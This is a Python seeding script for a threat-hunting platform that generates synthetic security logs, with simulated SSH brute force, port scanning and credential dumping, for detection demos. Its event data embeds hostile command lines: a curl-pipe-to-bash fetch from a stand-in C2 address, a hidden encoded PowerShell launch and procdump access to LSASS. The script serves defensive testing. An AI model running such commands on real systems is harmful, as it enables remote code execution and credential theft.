"""Seed the platform with realistic demo data so you can hunt before any real collectors exist.

    python -m scripts.seed_data                 # events -> Elasticsearch, watchlist + admin -> database

Creates 24 h of normal background traffic plus ONE multi-stage attack (all timestamps are
relative to 'now', so the data always looks fresh):

    203.0.113.50 brute-forces SSH on web01 -> logs in as root -> curl|bash from 198.51.100.77
    -> creates a backdoor user + cron job -> web01 beacons to 198.51.100.77 / c2.evil-updates.example
    192.0.2.44   port-scans the perimeter firewall
    win-ws01     encoded PowerShell, then LSASS memory access (credential dumping)

(All attacker addresses are from the RFC 5737 documentation ranges: they cannot be real hosts.)"""
from __future__ import annotations

import random
from datetime import datetime, timedelta, timezone

ATTACKER_SSH = "203.0.113.50"
C2_IP = "198.51.100.77"
C2_DOMAIN = "c2.evil-updates.example"
SCANNER = "192.0.2.44"
INTERNAL_HOSTS = ["web01", "db01", "app01"]
USERS = ["alice", "bob", "carol", "deploy"]


def _ev(ts: datetime, **fields) -> dict:
    doc: dict = {"@timestamp": ts.isoformat()}
    doc.update(fields)
    return doc


def generate_events(now: datetime | None = None, seed: int = 7) -> list[dict]:
    rnd = random.Random(seed)
    now = now or datetime.now(timezone.utc)
    ev: list[dict] = []

    # ---- background noise: 24h of ordinary activity
    for i in range(600):
        ts = now - timedelta(minutes=rnd.randint(40, 24 * 60))
        host = rnd.choice(INTERNAL_HOSTS)
        kind = rnd.random()
        if kind < 0.35:
            ev.append(_ev(ts, **{"event.category": "authentication", "event.outcome": "success", "event.action": "ssh_login",
                                 "host.name": host, "user.name": rnd.choice(USERS), "source.ip": f"10.0.{rnd.randint(1, 3)}.{rnd.randint(10, 60)}",
                                 "message": "Accepted publickey"}))
        elif kind < 0.42:
            ev.append(_ev(ts, **{"event.category": "authentication", "event.outcome": "failure", "event.action": "ssh_login",
                                 "host.name": host, "user.name": rnd.choice(USERS), "source.ip": f"10.0.1.{rnd.randint(10, 60)}",
                                 "message": "Failed password (typo)"}))
        elif kind < 0.7:
            ev.append(_ev(ts, **{"event.category": "network", "event.action": "connection_allowed", "host.name": host,
                                 "destination.ip": rnd.choice(["93.184.216.34", "1.1.1.1", "8.8.8.8"]), "destination.port": 443}))
        elif kind < 0.9:
            ev.append(_ev(ts, **{"event.category": "network", "event.action": "dns_query", "host.name": host,
                                 "dns.question.name": rnd.choice(["example.com", "ubuntu.com", "github.com", "pypi.org"])}))
        else:
            ev.append(_ev(ts, **{"event.category": "process", "event.action": "process_start", "host.name": host,
                                 "user.name": rnd.choice(USERS), "process.name": rnd.choice(["python3", "nginx", "cron", "bash"]),
                                 "process.command_line": rnd.choice(["python3 app.py", "nginx -g daemon off;", "/usr/sbin/cron -f"])}))

    # ---- attack 1: Linux intrusion on web01 (starts 40 minutes ago)
    t0 = now - timedelta(minutes=40)
    for i in range(45):  # brute force
        ev.append(_ev(t0 + timedelta(seconds=i * 6), **{
            "event.category": "authentication", "event.outcome": "failure", "event.action": "ssh_login",
            "host.name": "web01", "user.name": rnd.choice(["root", "admin", "ubuntu", "test"]), "source.ip": ATTACKER_SSH,
            "message": "Failed password for invalid user"}))
    t1 = t0 + timedelta(minutes=6)
    ev.append(_ev(t1, **{"event.category": "authentication", "event.outcome": "success", "event.action": "ssh_login",
                         "host.name": "web01", "user.name": "root", "source.ip": ATTACKER_SSH, "message": "Accepted password for root"}))
    ev.append(_ev(t1 + timedelta(minutes=2), **{
        "event.category": "process", "event.action": "process_start", "host.name": "web01", "user.name": "root",
        "process.name": "bash", "process.command_line": f"curl -s http://{C2_IP}/x.sh | bash"}))
    ev.append(_ev(t1 + timedelta(minutes=3), **{"event.category": "iam", "event.action": "user_created", "host.name": "web01",
                                                "user.name": "support", "message": "new user: name=support"}))
    ev.append(_ev(t1 + timedelta(minutes=4), **{"event.category": "configuration", "event.action": "cron_modified", "host.name": "web01",
                                                "user.name": "root", "message": "crontab modified"}))
    for i in range(6):  # beaconing
        ts = t1 + timedelta(minutes=5 + i * 3)
        ev.append(_ev(ts, **{"event.category": "network", "event.action": "connection_allowed", "host.name": "web01",
                             "destination.ip": C2_IP, "destination.port": 443}))
        ev.append(_ev(ts, **{"event.category": "network", "event.action": "dns_query", "host.name": "web01", "dns.question.name": C2_DOMAIN}))

    # ---- attack 2: port scan against the perimeter
    t2 = now - timedelta(minutes=3)
    for port in range(1, 61):
        ev.append(_ev(t2 + timedelta(seconds=port), **{"event.category": "network", "event.action": "connection_denied", "host.name": "fw01",
                                                       "source.ip": SCANNER, "destination.ip": "10.0.0.5", "destination.port": port * 7}))

    # ---- attack 3: Windows workstation (encoded PowerShell, then LSASS access)
    t3 = now - timedelta(minutes=25)
    ev.append(_ev(t3, **{"event.category": "process", "event.action": "process_start", "host.name": "win-ws01", "user.name": "bob",
                         "process.name": "powershell.exe",
                         "process.command_line": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ=="}))
    ev.append(_ev(t3 + timedelta(minutes=4), **{"event.category": "process", "event.action": "process_access", "event.code": "10",
                                                "host.name": "win-ws01", "user.name": "bob", "process.name": "procdump.exe",
                                                "winlog.event_data.TargetImage": "C:\\Windows\\System32\\lsass.exe"}))
    return ev


def main() -> None:  # pragma: no cover - needs live services
    from elasticsearch import helpers
    from sqlalchemy import select

    from app.core.config import get_settings
    from app.core.security import hash_password
    from app.db.models import User, WatchlistEntry
    from app.db.session import SessionLocal, init_db
    from app.services.es import ensure_index_template, get_es

    s = get_settings()
    es = get_es()
    ensure_index_template(es)
    index = f"thp-events-{datetime.now(timezone.utc):%Y.%m.%d}"
    actions = [{"_index": index, "_op_type": "create", "_source": e} for e in generate_events()]
    ok, errors = helpers.bulk(es, actions, raise_on_error=False)
    es.indices.refresh(index=index)
    print(f"indexed {ok} events into {index} ({len(errors) if isinstance(errors, list) else errors} errors)")

    init_db()
    with SessionLocal() as db:
        for ioc_type, value, note in [("ip", C2_IP, "Known C2 server (demo)"), ("domain", C2_DOMAIN, "Known C2 domain (demo)")]:
            if not db.scalars(select(WatchlistEntry).where(WatchlistEntry.value == value)).first():
                db.add(WatchlistEntry(ioc_type=ioc_type, value=value, source="seed", note=note))
        if s.admin_password and not db.scalars(select(User)).first():
            db.add(User(username=s.admin_username, password_hash=hash_password(s.admin_password), role="admin"))
        db.commit()

        # Retro-hunt the freshly indexed events so the dashboard is populated immediately.
        from app.services import correlation, detection
        from app.services.rules import load_rules

        summary = detection.run_all(es, db, load_rules(s.rules_dir), lookback_minutes=180)
        incidents = correlation.correlate(db, s.correlation_window_minutes)
        print(f"retro-hunt done: {summary['alerts_touched']} alerts, {len(incidents)} incident(s), errors={summary['errors']}")


if __name__ == "__main__":
    main()
